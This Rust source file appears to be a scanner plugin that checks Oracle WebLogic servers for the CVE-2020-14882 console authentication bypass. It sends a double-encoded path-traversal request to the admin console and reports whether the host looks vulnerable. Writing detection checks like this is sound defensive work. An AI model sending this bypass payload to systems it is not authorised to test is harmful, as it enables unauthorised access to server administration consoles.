/* http-vuln-cve2020-14882-4 - WebLogic console auth bypass probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
let port = unsafe { (*ctx).port };
let mut resp = String::new();
resp = match http_request(ctx, "GET", "/console/css/%252e%252e%252fconsole.portal", None, "", "", None, 8192) {
    Some(r) if !r.is_empty() => r,
    _ => { set_out(ctx, "http-vuln-cve2020-14882-4: no HTTP response"); return 0; }
};
if contains_ci(&resp, "WebLogic") {
    set_out(ctx, &format!("VULNERABLE: /console/css/%252e%252e%252fconsole.portal [{}] (CVE-2020-14882)", http_status(&resp)));
} else {
    set_out(ctx, &format!("not vulnerable: CVE-2020-14882 (/console/css/%252e%252e%252fconsole.portal [{}])", http_status(&resp)));
}
0
}
